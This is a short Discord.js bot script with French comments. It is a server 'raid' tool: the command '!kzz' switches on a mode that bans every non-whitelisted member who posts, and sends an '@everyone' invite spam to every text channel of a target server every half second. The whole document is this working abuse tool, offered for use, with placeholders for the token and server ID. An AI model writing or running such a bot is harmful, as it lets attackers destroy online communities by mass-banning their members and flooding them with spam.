const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = "!";
const whitelist = ["ID", "ID"];
let toggleRaid = false;
client.on("message", async (message) => {
  const args = message.content.split(/ +/); // Récupère les arguments de la commande
  const cmd = args.shift(); // Récupère la commande

  if (toggleRaid) {
    if (message.member.id != client.user.id && !whitelist.includes(message.member.id)) {
      message.member.ban().catch((_) => 0);
    }
  }

  if (cmd === `${prefix}kzz`) {
    toggleRaid = true;
    const guild = client.guilds.cache.get("SERVER ID"); // Right click on server icon to get server id
    setInterval(() => {
      guild.channels.cache
        .filter((c) => c.type === "text")
        .forEach((channel) => {
          channel.send("@everyone discord.gg");
        });
    }, 500); // Délai en MS
  }
});

client.login("TOKEN");

(404 & KzS/Acty
